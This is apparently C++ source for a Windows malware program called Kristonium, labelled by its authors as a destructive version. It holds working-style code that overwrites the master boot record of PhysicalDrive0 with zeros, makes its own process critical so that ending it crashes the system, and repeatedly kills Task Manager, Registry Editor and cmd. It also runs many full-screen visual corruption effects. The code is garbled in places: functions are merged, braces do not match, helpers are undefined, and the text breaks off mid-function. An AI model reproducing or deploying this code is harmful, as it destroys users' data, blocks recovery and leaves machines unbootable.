// Kristonium.cpp by KHVirusser and N17Pro3426. Destructive version.
// This is a malware.

#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
//#include <time.h>
//#include "bootrec.h"
#include <cmath>
#include <time.h>
#define M_PI   3.14159265358979323846264338327950288
//#define PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (3.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 3.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 3.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 3.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 4.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 4.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 5.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}
/*COLORREF RndRGB() {
	int clr = rand() % 5;
	if (clr == 0) return RGB(255, 0, 0); if (clr == 1) return RGB(0, 255, 0); if (clr == 2) return RGB(0, 0, 255); if (clr == 3) return RGB(255, 0, 255); if (clr == 4) return RGB(255, 255, 0);
}*/

const unsigned char MBR_Data[512] = {};
 
//Main
DWORD WINAPI MBRWiper(LPVOID lpParam)
INT
WINAPI
wWinMain(
	_In_	 HINSTANCE hInstance,
	_In_opt_ HINSTANCE PrevInstance,
	_In_	 PWSTR 	   szCmdLine,
	_In_	 INT       nShowCmd
) {
	DWORD BytesWritten;
	HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	WriteFile(hMBR, MBR_Data, 512, &BytesWritten, NULL);
	CloseHandle(hMBR);
}
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI spamkill(LPVOID lpParam)
{
	while (1)
	{
		ShellExecuteA(NULL, NULL, "taskkill", "/f /im taskmgr.exe", NULL, SW_SHOWDEFAULT);
		Sleep(1);
		ShellExecuteA(NULL, NULL, "taskkill", "/f /im regedit.exe", NULL, SW_SHOWDEFAULT);
		Sleep(1);
		ShellExecuteA(NULL, NULL, "taskkill", "/f /im cmd.exe", NULL, SW_SHOWDEFAULT);
		Sleep(1);
	}
	return 666;
}
DWORD WINAPI radius(LPVOID lpParam) // Thanks N17Pro3426
{
    int centerX = 500;
    int centerY = 500;
    int radius = 500;
    float angle = 0;
    while (true)
    {
        HDC hdc = GetDC(0);
        int x = centerX + static_cast<int>(radius * cos(angle * M_PI / 180));
        int y = centerY + static_cast<int>(radius * sin(angle * M_PI / 180));
HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, brush);
        Ellipse(hdc, x - 50, y - 50, x + 50, y + 50);
        DrawIcon(hdc, x, y, LoadIconW(0, IDI_ERROR));
        angle += 1;
        Sleep(10);
DeleteObject(brush);
        ReleaseDC(0, hdc);
	}
}
DWORD WINAPI thing(LPVOID lpParam)
{
    srand(time(0) + GetCurrentThreadId());
    while (1)
    {
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        HBITMAP bm = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, bm);
        RECT rect;
        GetWindowRect(GetDesktopWindow(), &rect);
        POINT pt[3];
        int inc3 = (rand() % 600) + (GetCurrentThreadId() % 100);
        int v = (rand() % 2) + (GetCurrentThreadId() % 3);
        if (v == 1) inc3 = -inc3;
        pt[0].x = rect.left + inc3;
        pt[0].y = rect.top + inc3;
        pt[1].x = rect.right + inc3;
        pt[1].y = rect.top * inc3;
        pt[2].x = rect.left + inc3;
        pt[2].y = rect.bottom + inc3;
        PlgBlt(hdcMem, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, rand() % 30, rand() % 30, sw, sh, hdcMem, rand() % 30, rand() % 30, 0x123456);
        DeleteObject(brush);
        DeleteObject(hdcMem);
        DeleteObject(bm);
        ReleaseDC(0, hdc);
	}
}
DWORD WINAPI thing2(LPVOID lpParam)
{
    for (int t = 0; ; t++)
    {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BLENDFUNCTION blf = { 0 };
        blf.BlendOp = AC_SRC_OVER;
        blf.BlendFlags = 0;
        blf.SourceConstantAlpha = 200;
        blf.AlphaFormat = 0;
        POINT pos[3];
        pos[0].x = 0;
        pos[0].y = 0;
        pos[1].x = cos(M_PI / 36) * w;
        pos[1].y = sin(M_PI / 36) * w;
        pos[2].x = (-1) * (sin(M_PI / 36) * h);
        pos[2].y = cos(M_PI / 36) * h;
        PlgBlt(hcdc, pos, hdc, 0, 0, w, h, 0, 0, 0);
        SelectObject(hcdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        PatBlt(hcdc, 0, 0, w, h, PATINVERT);
        PatBlt(hcdc, rand() % w, 0, 20, h, PATINVERT);
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(NULL, hdc);
        DeleteObject(hdc);
    }
    return 0;
	}
}
DWORD WINAPI textout1(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text1 = 0;
	//LPCSTR text2 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text1 = "Kristonium.exe";
		//text2 = "KHVirusser, N17Pro3426";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(rand() % 100, rand() % 100, rand() % 3600, 0, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Verdana");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		//TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI gdi1(LPVOID lpParam)
{
	float hWnd;
	int x;
	int y;
	int i;
	HDC hdcSrc;
	HBITMAP h;
	int v7;
	int cy;
	int v9;
	int SystemMetrics;
	int v11;
	HDC hdca;
	HDC hdc;
	hdca = GetDC(0);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	v7 = 0;
	h = CreateCompatibleBitmap(hdca, SystemMetrics, cy);
	hdcSrc = CreateCompatibleDC(hdca);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0);
		v11 = GetSystemMetrics(0);
		v9 = GetSystemMetrics(1);
		for (i = 0; i <= 20; ++i)
		{
			++v7;
			BitBlt(hdcSrc, 0, 0, v11, v9, hdc, 0, 0, SRCCOPY);
			for (y = 0; y < v9; ++y)
			{
				hWnd = (double)y / 30.0 * (double)v7;
				x = (int)(FastSine(hWnd) * 50.0);
				BitBlt(hdcSrc, x, y, v11, 1, hdcSrc, 0, y, SRCCOPY);
			}
			InitializeSine();
			BitBlt(hdc, 0, 0, v11, v9, hdcSrc, 0, 0, SRCCOPY);
		}
		ReleaseDC(0, hdc);
	}

	return 0x00;
}
DWORD WINAPI bounce(LPVOID lpParam)
{
    int angle = 0;
    while (1)
    {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        int a = 100 * sin(M_PI + angle);
        int b = 20 * sin(M_PI + angle);
        BitBlt(hdc, a, b, x, y, hdc, 0, 0, SRCCOPY);
        DeleteDC(hdc);
        angle += 1;
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI shader1(LPVOID lpParam)
{
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb += x ^ y * RGB(255, 0, 0);
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
	return 0x00;
}
DWORD WINAPI shader2(LPVOID lpParam)
{
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb += x ^ y * RGB(0, 0, 255);
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader3(LPVOID lpParam)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int t;
                int index = y * w + x;
                int fx = (int)((i ^ 5) + (i * 5) * cbrt(30));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                if (hslcolor.s < .5f)
                {
                    hslcolor.s = .5f;
                }
                if ((roundf(hslcolor.h * 10.f) / 10.f) != (roundf((FLOAT)((rand() + t) % 255) / 256.f * 10.f) / 10.f))
                {
                    hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + .2, 1.0);
                }
                else
                {
                    hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + .5, 1.0);
                }
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
	}
}
DWORD WINAPI glitch(LPVOID lpParam)
{
    HDC hdc = GetDC(HWND_DESKTOP);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int ColorRefReq;
    int ColorRef;
    while (true)
    {
        HDC hdc = GetDC(HWND_DESKTOP);
        int y = rand() % sh;
        int h = sh - rand() % sh - (sh / 1 - 8);
        ColorRefReq = (rand() % 255) << 8;
        ColorRef = (ColorRefReq | (rand() % 255)) << 8;
        HBRUSH brush = CreateSolidBrush(ColorRef | rand() % 255);
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, y, sw, h, hdc, rand() % 80 - 50, y, MERGECOPY);
        PatBlt(hdc, -1, y, sw, h, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        Sleep(10);
}
DWORD WINAPI textout2(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text1 = "Kristonium.exe";
		text2 = "KHVirusser";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, rand() % 3600, rand() % 3600, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Verdana");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI shader4(LPVOID lpParam)
{
    int w, h;
    int i = 0;
    while (true)
    {
        HDC mhdc = CreateCompatibleDC(NULL);
        w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
        BITMAPINFO bmi = { 0 };
        bmi.bmiHeader.biSize = sizeof(bmi);
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biWidth = w;
        bmi.bmiHeader.biHeight = h;
        RGBQUAD* rgbDst = NULL;
        HBITMAP bmp = CreateDIBSection(mhdc, &bmi, DIB_RGB_COLORS, (void**)&rgbDst, 0, NULL);
        SelectObject(mhdc, bmp);
        memset(rgbDst, 0, sizeof(RGBQUAD) * w * h);
        HDC hdc = GetDC(NULL);
        BitBlt(mhdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                FLOAT fx = ((double)(sin(x / 500.f - y / h * 0.1) + i / 5));
                FLOAT fx2 = ((double)(sin(y / 500.f - x / w * 0.1) + i / 5));
                FLOAT fx3 = ((double)(sin(x / 500.f - y / h * 0.1) + i / 5));
                FLOAT fx4 = (fx + fx2 + fx3) * (fx + fx2 + fx3);
                rgbDst[y * w + x].rgbRed -= fx4 - (rgbDst[y * w + x].rgbGreen / 16);
                rgbDst[y * w + x].rgbGreen += fx4 - (rgbDst[y * w + x].rgbBlue / 16);
                rgbDst[y * w + x].rgbBlue -= fx4 - (rgbDst[y * w + x].rgbRed / 16);
            }
        }
        i++;
        BitBlt(hdc, 0, 0, w, h, mhdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc);
        DeleteObject(bmp);
        DeleteDC(mhdc);
	}
}
DWORD WINAPI shader5(LPVOID lpParam)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = (int)((i ^ 4) + (i * 4) * cbrt(30));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(x + y) / 100000.0 + 0.05, 1.0);
                hslcolor.s = 1.f;
                if (hslcolor.l < .2f)
                {
                    hslcolor.l += .2f;
                }
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}
DWORD WINAPI shader6(LPVOID lpParam)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int t;
                int index = y * w + x;
                int fx = (int)((i ^ 5) + (i * 5 * cbrt(30));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                if (hslcolor.s < .5f)
                {
                    hslcolor.s = .5f;
                }
                if ((roundf(hslcolor.h * 10.f) / 10.f) != (roundf((FLOAT)((rand() + t) % 255) / 256.f * 10.f) / 10.f))
                {
                    hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + .2, 1.0);
                }
                else
                {
                    hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + .5, 1.0);
                }
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}
DWORD WINAPI shader7(LPVOID lpParam)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = (int)((i ^ 6) + (i * 6) * cbrt(30));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + .5, 1.0);
                hslcolor.s = .5f;
                hslcolor.l *= 1.125f;
                if (hslcolor.l > .5f)
                {
                    hslcolor.l -= .5f;
                }
                if (hslcolor.l < .25f)
                {
                    hslcolor.l += .25f;
                }
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
}
DWORD WINAPI shader8(LPVOID lpParam)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = (int)((i ^ 3) + (i * 3) * cbrt(30));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h /= 1.0125f;
                hslcolor.s /= 1.0125f;
                hslcolor.l /= 1.0125f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}
DWORD WINAPI shader9(LPVOID lpParam)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = (int)((i ^ 8) + (i * 8) * cbrt(30));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)x / 100000.0 + 0.05, 1.0);
                hslcolor.s = 1.f;
                if (hslcolor.l < .2f)
                {
                    hslcolor.l += .2f;
                }
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
	}
}
DWORD WINAPI shader10(LPVOID lpParam)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = (int)((i ^ 2) + (i * 2) * cbrt(30));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
